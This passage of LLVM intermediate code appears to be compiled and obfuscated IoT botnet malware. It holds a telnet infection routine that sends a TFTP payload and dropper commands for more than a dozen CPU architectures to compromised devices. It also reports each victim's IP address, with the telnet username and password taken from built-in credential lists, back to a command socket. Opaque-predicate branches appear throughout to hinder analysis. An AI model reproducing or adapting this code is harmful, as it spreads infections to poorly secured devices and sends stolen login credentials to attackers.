  %1331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1330, i32 0, i32 1
  %1332 = bitcast i32* %1331 to %struct.in_addr*
  %1333 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1332, i32 0, i32 0
  %1334 = load i32, i32* %1333, align 4
  %1335 = call i8* @inet_ntoa(i32 %1334) #5
  %1336 = load i32, i32* %6, align 4
  %1337 = sext i32 %1336 to i64
  %1338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1337
  %1339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1338, i32 0, i32 4
  %1340 = load i8, i8* %1339, align 2
  %1341 = zext i8 %1340 to i64
  %1342 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %1341
  %1343 = load i8*, i8** %1342, align 8
  %1344 = load i32, i32* %6, align 4
  %1345 = sext i32 %1344 to i64
  %1346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1345
  %1347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1346, i32 0, i32 5
  %1348 = load i8, i8* %1347, align 1
  %1349 = zext i8 %1348 to i64
  %1350 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %1349
  %1351 = load i8*, i8** %1350, align 8
  %1352 = call i32 (i32, i8*, ...) @sockprintf(i32 %1327, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.285, i32 0, i32 0), i8* %1335, i8* %1343, i8* %1351)
  %1353 = load i32, i32* %6, align 4
  %1354 = sext i32 %1353 to i64
  %1355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1354
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1355, i32 0, i32 0
  %1357 = load i32, i32* %1356, align 16
  %1358 = load i8*, i8** @tftppayload, align 8
  %1359 = load i8*, i8** @tftppayload, align 8
  %1360 = call i64 @strlen(i8* %1359) #9
  %1361 = call i64 @send(i32 %1357, i8* %1358, i64 %1360, i32 16384)
  %1362 = icmp slt i64 %1361, 0
  br i1 %1362, label %1363, label %1367

; <label>:1363:                                   ; preds = %1326
  %1364 = load i32, i32* %6, align 4
  %1365 = sext i32 %1364 to i64
  %1366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1365
  call void @reset_telstate(%struct.telstate_t* %1366)
  br label %1914

; <label>:1367:                                   ; preds = %1326
  %1368 = load i32, i32* %6, align 4
  %1369 = sext i32 %1368 to i64
  %1370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1369
  call void @advance_telstate(%struct.telstate_t* %1370, i32 16)
  br label %1913

; <label>:1371:                                   ; preds = %originalBBpart218
  %1372 = load i32, i32* @mainCommSock, align 4
  %1373 = load i32, i32* %6, align 4
  %1374 = sext i32 %1373 to i64
  %1375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1374
  %1376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1375, i32 0, i32 1
  %1377 = bitcast i32* %1376 to %struct.in_addr*
  %1378 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1377, i32 0, i32 0
  %1379 = load i32, i32* %1378, align 4
  %1380 = call i8* @inet_ntoa(i32 %1379) #5
  %1381 = load i32, i32* %6, align 4
  %1382 = sext i32 %1381 to i64
  %1383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1382
  %1384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1383, i32 0, i32 4
  %1385 = load i8, i8* %1384, align 2
  %1386 = zext i8 %1385 to i64
  %1387 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %1386
  %1388 = load i8*, i8** %1387, align 8
  %1389 = load i32, i32* %6, align 4
  %1390 = sext i32 %1389 to i64
  %1391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1390
  %1392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1391, i32 0, i32 5
  %1393 = load i8, i8* %1392, align 1
  %1394 = zext i8 %1393 to i64
  %1395 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %1394
  %1396 = load i8*, i8** %1395, align 8
  %1397 = call i32 (i32, i8*, ...) @sockprintf(i32 %1372, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.286, i32 0, i32 0), i8* %1380, i8* %1388, i8* %1396)
  store i32 0, i32* %29, align 4
  store i32 0, i32* %29, align 4
  br label %1398

; <label>:1398:                                   ; preds = %1860, %1371
  %1399 = load i32, i32* @x.71
  %1400 = load i32, i32* @y.72
  %1401 = sub i32 %1399, 1
  %1402 = mul i32 %1399, %1401
  %1403 = urem i32 %1402, 2
  %1404 = icmp eq i32 %1403, 0
  %1405 = icmp slt i32 %1400, 10
  %1406 = or i1 %1404, %1405
  br i1 %1406, label %originalBB163, label %originalBB163alteredBB

originalBB163:                                    ; preds = %originalBB163alteredBB, %1398
  %1407 = load i32, i32* %29, align 4
  %1408 = icmp slt i32 %1407, 1
  %1409 = load i32, i32* @x.71
  %1410 = load i32, i32* @y.72
  %1411 = sub i32 %1409, 1
  %1412 = mul i32 %1409, %1411
  %1413 = urem i32 %1412, 2
  %1414 = icmp eq i32 %1413, 0
  %1415 = icmp slt i32 %1410, 10
  %1416 = or i1 %1414, %1415
  br i1 %1416, label %originalBBpart2165, label %originalBB163alteredBB

originalBBpart2165:                               ; preds = %originalBB163
  br i1 %1408, label %1417, label %1863

; <label>:1417:                                   ; preds = %originalBBpart2165
  %1418 = load i32, i32* %6, align 4
  %1419 = sext i32 %1418 to i64
  %1420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1419
  %1421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1420, i32 0, i32 0
  %1422 = load i32, i32* %1421, align 16
  %1423 = load i32, i32* %29, align 4
  %1424 = sext i32 %1423 to i64
  %1425 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_mips, i64 0, i64 %1424
  %1426 = load i8*, i8** %1425, align 8
  %1427 = call i32 (i32, i8*, ...) @sockprintf(i32 %1422, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1426)
  %1428 = icmp slt i32 %1427, 0
  br i1 %1428, label %1429, label %1433

; <label>:1429:                                   ; preds = %1417
  %1430 = load i32, i32* %6, align 4
  %1431 = sext i32 %1430 to i64
  %1432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1431
  call void @reset_telstate(%struct.telstate_t* %1432)
  br label %1860

; <label>:1433:                                   ; preds = %1417
  %1434 = load i32, i32* %6, align 4
  %1435 = sext i32 %1434 to i64
  %1436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1435
  %1437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1436, i32 0, i32 0
  %1438 = load i32, i32* %1437, align 16
  %1439 = load i32, i32* %29, align 4
  %1440 = sext i32 %1439 to i64
  %1441 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_mipsel, i64 0, i64 %1440
  %1442 = load i8*, i8** %1441, align 8
  %1443 = call i32 (i32, i8*, ...) @sockprintf(i32 %1438, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1442)
  %1444 = icmp slt i32 %1443, 0
  br i1 %1444, label %1445, label %1465

; <label>:1445:                                   ; preds = %1433
  %1446 = load i32, i32* @x.71
  %1447 = load i32, i32* @y.72
  %1448 = sub i32 %1446, 1
  %1449 = mul i32 %1446, %1448
  %1450 = urem i32 %1449, 2
  %1451 = icmp eq i32 %1450, 0
  %1452 = icmp slt i32 %1447, 10
  %1453 = or i1 %1451, %1452
  br i1 %1453, label %originalBB167, label %originalBB167alteredBB

originalBB167:                                    ; preds = %originalBB167alteredBB, %1445
  %1454 = load i32, i32* %6, align 4
  %1455 = sext i32 %1454 to i64
  %1456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1455
  call void @reset_telstate(%struct.telstate_t* %1456)
  %1457 = load i32, i32* @x.71
  %1458 = load i32, i32* @y.72
  %1459 = sub i32 %1457, 1
  %1460 = mul i32 %1457, %1459
  %1461 = urem i32 %1460, 2
  %1462 = icmp eq i32 %1461, 0
  %1463 = icmp slt i32 %1458, 10
  %1464 = or i1 %1462, %1463
  br i1 %1464, label %originalBBpart2169, label %originalBB167alteredBB

originalBBpart2169:                               ; preds = %originalBB167
  br label %1860

; <label>:1465:                                   ; preds = %1433
  %1466 = load i32, i32* %6, align 4
  %1467 = sext i32 %1466 to i64
  %1468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1467
  %1469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1468, i32 0, i32 0
  %1470 = load i32, i32* %1469, align 16
  %1471 = load i32, i32* %29, align 4
  %1472 = sext i32 %1471 to i64
  %1473 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_sh4, i64 0, i64 %1472
  %1474 = load i8*, i8** %1473, align 8
  %1475 = call i32 (i32, i8*, ...) @sockprintf(i32 %1470, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1474)
  %1476 = icmp slt i32 %1475, 0
  br i1 %1476, label %1477, label %1481

; <label>:1477:                                   ; preds = %1465
  %1478 = load i32, i32* %6, align 4
  %1479 = sext i32 %1478 to i64
  %1480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1479
  call void @reset_telstate(%struct.telstate_t* %1480)
  br label %1860

; <label>:1481:                                   ; preds = %1465
  %1482 = load i32, i32* %6, align 4
  %1483 = sext i32 %1482 to i64
  %1484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1483
  %1485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1484, i32 0, i32 0
  %1486 = load i32, i32* %1485, align 16
  %1487 = load i32, i32* %29, align 4
  %1488 = sext i32 %1487 to i64
  %1489 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_x86_64, i64 0, i64 %1488
  %1490 = load i8*, i8** %1489, align 8
  %1491 = call i32 (i32, i8*, ...) @sockprintf(i32 %1486, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1490)
  %1492 = icmp slt i32 %1491, 0
  br i1 %1492, label %1493, label %1497

; <label>:1493:                                   ; preds = %1481
  %1494 = load i32, i32* %6, align 4
  %1495 = sext i32 %1494 to i64
  %1496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1495
  call void @reset_telstate(%struct.telstate_t* %1496)
  br label %1860

; <label>:1497:                                   ; preds = %1481
  %1498 = load i32, i32* @x.71
  %1499 = load i32, i32* @y.72
  %1500 = sub i32 %1498, 1
  %1501 = mul i32 %1498, %1500
  %1502 = urem i32 %1501, 2
  %1503 = icmp eq i32 %1502, 0
  %1504 = icmp slt i32 %1499, 10
  %1505 = or i1 %1503, %1504
  br i1 %1505, label %originalBB171, label %originalBB171alteredBB

originalBB171:                                    ; preds = %originalBB171alteredBB, %1497
  %1506 = load i32, i32* %6, align 4
  %1507 = sext i32 %1506 to i64
  %1508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1507
  %1509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1508, i32 0, i32 0
  %1510 = load i32, i32* %1509, align 16
  %1511 = load i32, i32* %29, align 4
  %1512 = sext i32 %1511 to i64
  %1513 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_armv6l, i64 0, i64 %1512
  %1514 = load i8*, i8** %1513, align 8
  %1515 = call i32 (i32, i8*, ...) @sockprintf(i32 %1510, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1514)
  %1516 = icmp slt i32 %1515, 0
  %1517 = load i32, i32* @x.71
  %1518 = load i32, i32* @y.72
  %1519 = sub i32 %1517, 1
  %1520 = mul i32 %1517, %1519
  %1521 = urem i32 %1520, 2
  %1522 = icmp eq i32 %1521, 0
  %1523 = icmp slt i32 %1518, 10
  %1524 = or i1 %1522, %1523
  br i1 %1524, label %originalBBpart2173, label %originalBB171alteredBB

originalBBpart2173:                               ; preds = %originalBB171
  br i1 %1516, label %1525, label %1529

; <label>:1525:                                   ; preds = %originalBBpart2173
  %1526 = load i32, i32* %6, align 4
  %1527 = sext i32 %1526 to i64
  %1528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1527
  call void @reset_telstate(%struct.telstate_t* %1528)
  br label %1860

; <label>:1529:                                   ; preds = %originalBBpart2173
  %1530 = load i32, i32* %6, align 4
  %1531 = sext i32 %1530 to i64
  %1532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1531
  %1533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1532, i32 0, i32 0
  %1534 = ptrtoint i32* %1533 to i32
  %1535 = load i32, i32* %29, align 4
  %1536 = sext i32 %1535 to i64
  %1537 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_i686, i64 0, i64 %1536
  %1538 = load i8*, i8** %1537, align 8
  %1539 = call i32 (i32, i8*, ...) @sockprintf(i32 %1534, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1538)
  %1540 = icmp slt i32 %1539, 0
  br i1 %1540, label %1541, label %1561

; <label>:1541:                                   ; preds = %1529
  %1542 = load i32, i32* @x.71
  %1543 = load i32, i32* @y.72
  %1544 = sub i32 %1542, 1
  %1545 = mul i32 %1542, %1544
  %1546 = urem i32 %1545, 2
  %1547 = icmp eq i32 %1546, 0
  %1548 = icmp slt i32 %1543, 10
  %1549 = or i1 %1547, %1548
  br i1 %1549, label %originalBB175, label %originalBB175alteredBB

originalBB175:                                    ; preds = %originalBB175alteredBB, %1541
  %1550 = load i32, i32* %6, align 4
  %1551 = sext i32 %1550 to i64
  %1552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1551
  call void @reset_telstate(%struct.telstate_t* %1552)
  %1553 = load i32, i32* @x.71
  %1554 = load i32, i32* @y.72
  %1555 = sub i32 %1553, 1
  %1556 = mul i32 %1553, %1555
  %1557 = urem i32 %1556, 2
  %1558 = icmp eq i32 %1557, 0
  %1559 = icmp slt i32 %1554, 10
  %1560 = or i1 %1558, %1559
  br i1 %1560, label %originalBBpart2177, label %originalBB175alteredBB

originalBBpart2177:                               ; preds = %originalBB175
  br label %1860

; <label>:1561:                                   ; preds = %1529
  %1562 = load i32, i32* %6, align 4
  %1563 = sext i32 %1562 to i64
  %1564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1563
  %1565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1564, i32 0, i32 0
  %1566 = ptrtoint i32* %1565 to i32
  %1567 = load i32, i32* %29, align 4
  %1568 = sext i32 %1567 to i64
  %1569 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_powerpc, i64 0, i64 %1568
  %1570 = load i8*, i8** %1569, align 8
  %1571 = call i32 (i32, i8*, ...) @sockprintf(i32 %1566, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1570)
  %1572 = icmp slt i32 %1571, 0
  br i1 %1572, label %1573, label %1577

; <label>:1573:                                   ; preds = %1561
  %1574 = load i32, i32* %6, align 4
  %1575 = sext i32 %1574 to i64
  %1576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1575
  call void @reset_telstate(%struct.telstate_t* %1576)
  br label %1860

; <label>:1577:                                   ; preds = %1561
  %1578 = load i32, i32* %6, align 4
  %1579 = sext i32 %1578 to i64
  %1580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1579
  %1581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1580, i32 0, i32 0
  %1582 = ptrtoint i32* %1581 to i32
  %1583 = load i32, i32* %29, align 4
  %1584 = sext i32 %1583 to i64
  %1585 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_i586, i64 0, i64 %1584
  %1586 = load i8*, i8** %1585, align 8
  %1587 = call i32 (i32, i8*, ...) @sockprintf(i32 %1582, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1586)
  %1588 = icmp slt i32 %1587, 0
  br i1 %1588, label %1589, label %1593

; <label>:1589:                                   ; preds = %1577
  %1590 = load i32, i32* %6, align 4
  %1591 = sext i32 %1590 to i64
  %1592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1591
  call void @reset_telstate(%struct.telstate_t* %1592)
  br label %1860

; <label>:1593:                                   ; preds = %1577
  %1594 = load i32, i32* @x.71
  %1595 = load i32, i32* @y.72
  %1596 = sub i32 %1594, 1
  %1597 = mul i32 %1594, %1596
  %1598 = urem i32 %1597, 2
  %1599 = icmp eq i32 %1598, 0
  %1600 = icmp slt i32 %1595, 10
  %1601 = or i1 %1599, %1600
  br i1 %1601, label %originalBB179, label %originalBB179alteredBB

originalBB179:                                    ; preds = %originalBB179alteredBB, %1593
  %1602 = load i32, i32* %6, align 4
  %1603 = sext i32 %1602 to i64
  %1604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1603
  %1605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1604, i32 0, i32 0
  %1606 = ptrtoint i32* %1605 to i32
  %1607 = load i32, i32* %29, align 4
  %1608 = sext i32 %1607 to i64
  %1609 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_m68k, i64 0, i64 %1608
  %1610 = load i8*, i8** %1609, align 8
  %1611 = call i32 (i32, i8*, ...) @sockprintf(i32 %1606, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1610)
  %1612 = icmp slt i32 %1611, 0
  %1613 = load i32, i32* @x.71
  %1614 = load i32, i32* @y.72
  %1615 = sub i32 %1613, 1
  %1616 = mul i32 %1613, %1615
  %1617 = urem i32 %1616, 2
  %1618 = icmp eq i32 %1617, 0
  %1619 = icmp slt i32 %1614, 10
  %1620 = or i1 %1618, %1619
  br i1 %1620, label %originalBBpart2181, label %originalBB179alteredBB

originalBBpart2181:                               ; preds = %originalBB179
  br i1 %1612, label %1621, label %1625

; <label>:1621:                                   ; preds = %originalBBpart2181
  %1622 = load i32, i32* %6, align 4
  %1623 = sext i32 %1622 to i64
  %1624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1623
  call void @reset_telstate(%struct.telstate_t* %1624)
  br label %1860

; <label>:1625:                                   ; preds = %originalBBpart2181
  %1626 = load i32, i32* %6, align 4
  %1627 = sext i32 %1626 to i64
  %1628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1627
  %1629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1628, i32 0, i32 0
  %1630 = ptrtoint i32* %1629 to i32
  %1631 = load i32, i32* %29, align 4
  %1632 = sext i32 %1631 to i64
  %1633 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_sparc, i64 0, i64 %1632
  %1634 = load i8*, i8** %1633, align 8
  %1635 = call i32 (i32, i8*, ...) @sockprintf(i32 %1630, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1634)
  %1636 = icmp slt i32 %1635, 0
  br i1 %1636, label %1637, label %1641

; <label>:1637:                                   ; preds = %1625
  %1638 = load i32, i32* %6, align 4
  %1639 = sext i32 %1638 to i64
  %1640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1639
  call void @reset_telstate(%struct.telstate_t* %1640)
  br label %1860

; <label>:1641:                                   ; preds = %1625
  %1642 = load i32, i32* %6, align 4
  %1643 = sext i32 %1642 to i64
  %1644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1643
  %1645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1644, i32 0, i32 0
  %1646 = ptrtoint i32* %1645 to i32
  %1647 = load i32, i32* %29, align 4
  %1648 = sext i32 %1647 to i64
  %1649 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_armv4l, i64 0, i64 %1648
  %1650 = load i8*, i8** %1649, align 8
  %1651 = call i32 (i32, i8*, ...) @sockprintf(i32 %1646, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1650)
  %1652 = icmp slt i32 %1651, 0
  br i1 %1652, label %1653, label %1673

; <label>:1653:                                   ; preds = %1641
  %1654 = load i32, i32* @x.71
  %1655 = load i32, i32* @y.72
  %1656 = sub i32 %1654, 1
  %1657 = mul i32 %1654, %1656
  %1658 = urem i32 %1657, 2
  %1659 = icmp eq i32 %1658, 0
  %1660 = icmp slt i32 %1655, 10
  %1661 = or i1 %1659, %1660
  br i1 %1661, label %originalBB183, label %originalBB183alteredBB

originalBB183:                                    ; preds = %originalBB183alteredBB, %1653
  %1662 = load i32, i32* %6, align 4
  %1663 = sext i32 %1662 to i64
  %1664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1663
  call void @reset_telstate(%struct.telstate_t* %1664)
  %1665 = load i32, i32* @x.71
  %1666 = load i32, i32* @y.72
  %1667 = sub i32 %1665, 1
  %1668 = mul i32 %1665, %1667
  %1669 = urem i32 %1668, 2
  %1670 = icmp eq i32 %1669, 0
  %1671 = icmp slt i32 %1666, 10
  %1672 = or i1 %1670, %1671
  br i1 %1672, label %originalBBpart2185, label %originalBB183alteredBB

originalBBpart2185:                               ; preds = %originalBB183
  br label %1860

; <label>:1673:                                   ; preds = %1641
  %1674 = load i32, i32* %6, align 4
  %1675 = sext i32 %1674 to i64
  %1676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1675
  %1677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1676, i32 0, i32 0
  %1678 = load i32, i32* %1677, align 16
  %1679 = load i32, i32* %29, align 4
  %1680 = sext i32 %1679 to i64
  %1681 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_armv5l, i64 0, i64 %1680
  %1682 = load i8*, i8** %1681, align 8
  %1683 = call i32 (i32, i8*, ...) @sockprintf(i32 %1678, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1682)
  %1684 = icmp slt i32 %1683, 0
  br i1 %1684, label %1685, label %1705

; <label>:1685:                                   ; preds = %1673
  %1686 = load i32, i32* @x.71
  %1687 = load i32, i32* @y.72
  %1688 = sub i32 %1686, 1
  %1689 = mul i32 %1686, %1688
  %1690 = urem i32 %1689, 2
  %1691 = icmp eq i32 %1690, 0
  %1692 = icmp slt i32 %1687, 10
  %1693 = or i1 %1691, %1692
  br i1 %1693, label %originalBB187, label %originalBB187alteredBB

originalBB187:                                    ; preds = %originalBB187alteredBB, %1685
  %1694 = load i32, i32* %6, align 4
  %1695 = sext i32 %1694 to i64
  %1696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1695
  call void @reset_telstate(%struct.telstate_t* %1696)
  %1697 = load i32, i32* @x.71
  %1698 = load i32, i32* @y.72
  %1699 = sub i32 %1697, 1
  %1700 = mul i32 %1697, %1699
  %1701 = urem i32 %1700, 2
  %1702 = icmp eq i32 %1701, 0
  %1703 = icmp slt i32 %1698, 10
  %1704 = or i1 %1702, %1703
  br i1 %1704, label %originalBBpart2189, label %originalBB187alteredBB

originalBBpart2189:                               ; preds = %originalBB187
  br label %1860

; <label>:1705:                                   ; preds = %1673
  %1706 = load i32, i32* %6, align 4
  %1707 = sext i32 %1706 to i64
  %1708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1707
  %1709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1708, i32 0, i32 0
  %1710 = load i32, i32* %1709, align 16
  %1711 = load i8*, i8** @dropper_powerpc440fp, align 8
  %1712 = load i32, i32* %29, align 4
  %1713 = sext i32 %1712 to i64
  %1714 = getelementptr inbounds i8, i8* %1711, i64 %1713
  %1715 = load i8, i8* %1714, align 1
  %1716 = sext i8 %1715 to i32
  %1717 = call i32 (i32, i8*, ...) @sockprintf(i32 %1710, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i32 %1716)
  %1718 = icmp slt i32 %1717, 0
  br i1 %1718, label %1719, label %1723

; <label>:1719:                                   ; preds = %1705
  %1720 = load i32, i32* %6, align 4
  %1721 = sext i32 %1720 to i64
  %1722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1721
  call void @reset_telstate(%struct.telstate_t* %1722)
  br label %1860

; <label>:1723:                                   ; preds = %1705
  %1724 = load i32, i32* @x.71
  %1725 = load i32, i32* @y.72
  %1726 = sub i32 %1724, 1
  %1727 = mul i32 %1724, %1726
  %1728 = urem i32 %1727, 2
  %1729 = icmp eq i32 %1728, 0
  %1730 = icmp slt i32 %1725, 10
  %1731 = or i1 %1729, %1730
  br i1 %1731, label %originalBB191, label %originalBB191alteredBB

originalBB191:                                    ; preds = %originalBB191alteredBB, %1723
  %1732 = load i32, i32* @mainCommSock, align 4
  %1733 = load i32, i32* %6, align 4
  %1734 = sext i32 %1733 to i64
  %1735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1734
  %1736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1735, i32 0, i32 1
  %1737 = bitcast i32* %1736 to %struct.in_addr*
  %1738 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1737, i32 0, i32 0
  %1739 = load i32, i32* %1738, align 4
  %1740 = call i8* @inet_ntoa(i32 %1739) #5
  %1741 = load i32, i32* %6, align 4
  %1742 = sext i32 %1741 to i64
  %1743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1742
  %1744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1743, i32 0, i32 4
  %1745 = load i8, i8* %1744, align 2
  %1746 = zext i8 %1745 to i64
  %1747 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %1746
  %1748 = load i8*, i8** %1747, align 8
  %1749 = load i32, i32* %6, align 4
  %1750 = sext i32 %1749 to i64
  %1751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1750
  %1752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1751, i32 0, i32 5
  %1753 = load i8, i8* %1752, align 1
  %1754 = zext i8 %1753 to i64
  %1755 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %1754
  %1756 = load i8*, i8** %1755, align 8
  %1757 = call i32 (i32, i8*, ...) @sockprintf(i32 %1732, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.288, i32 0, i32 0), i8* %1740, i8* %1748, i8* %1756)
  %1758 = load i32, i32* @x.71
  %1759 = load i32, i32* @y.72
  %1760 = sub i32 %1758, 1
  %1761 = mul i32 %1758, %1760
  %1762 = urem i32 %1761, 2
  %1763 = icmp eq i32 %1762, 0
  %1764 = icmp slt i32 %1759, 10
  %1765 = or i1 %1763, %1764
  br i1 %1765, label %originalBBpart2193, label %originalBB191alteredBB

originalBBpart2193:                               ; preds = %originalBB191
  br label %1766

; <label>:1766:                                   ; preds = %originalBBpart2193
  %1767 = load i32, i32* @x.71
  %1768 = load i32, i32* @y.72
  %1769 = sub i32 %1767, 1
  %1770 = mul i32 %1767, %1769
  %1771 = urem i32 %1770, 2
  %1772 = icmp eq i32 %1771, 0
  %1773 = icmp slt i32 %1768, 10
  %1774 = or i1 %1772, %1773
  br i1 %1774, label %originalBB195, label %originalBB195alteredBB

originalBB195:                                    ; preds = %originalBB195alteredBB, %1766
  %1775 = load i32, i32* @x.71
  %1776 = load i32, i32* @y.72
  %1777 = sub i32 %1775, 1
  %1778 = mul i32 %1775, %1777
  %1779 = urem i32 %1778, 2
  %1780 = icmp eq i32 %1779, 0
  %1781 = icmp slt i32 %1776, 10
  %1782 = or i1 %1780, %1781
  br i1 %1782, label %originalBBpart2197, label %originalBB195alteredBB

originalBBpart2197:                               ; preds = %originalBB195
  br label %1783

; <label>:1783:                                   ; preds = %originalBBpart2197
  %1784 = load i32, i32* @x.71
  %1785 = load i32, i32* @y.72
  %1786 = sub i32 %1784, 1
  %1787 = mul i32 %1784, %1786
  %1788 = urem i32 %1787, 2
  %1789 = icmp eq i32 %1788, 0
  %1790 = icmp slt i32 %1785, 10
  %1791 = or i1 %1789, %1790
  br i1 %1791, label %originalBB199, label %originalBB199alteredBB

originalBB199:                                    ; preds = %originalBB199alteredBB, %1783
  %1792 = load i32, i32* @x.71
  %1793 = load i32, i32* @y.72
  %1794 = sub i32 %1792, 1
  %1795 = mul i32 %1792, %1794
  %1796 = urem i32 %1795, 2
  %1797 = icmp eq i32 %1796, 0
  %1798 = icmp slt i32 %1793, 10
  %1799 = or i1 %1797, %1798
  br i1 %1799, label %originalBBpart2201, label %originalBB199alteredBB

originalBBpart2201:                               ; preds = %originalBB199
  br label %1800

; <label>:1800:                                   ; preds = %originalBBpart2201
  br label %1801

; <label>:1801:                                   ; preds = %1800
  br label %1802

; <label>:1802:                                   ; preds = %1801
  br label %1803

; <label>:1803:                                   ; preds = %1802
  %1804 = load i32, i32* @x.71
  %1805 = load i32, i32* @y.72
  %1806 = sub i32 %1804, 1
  %1807 = mul i32 %1804, %1806
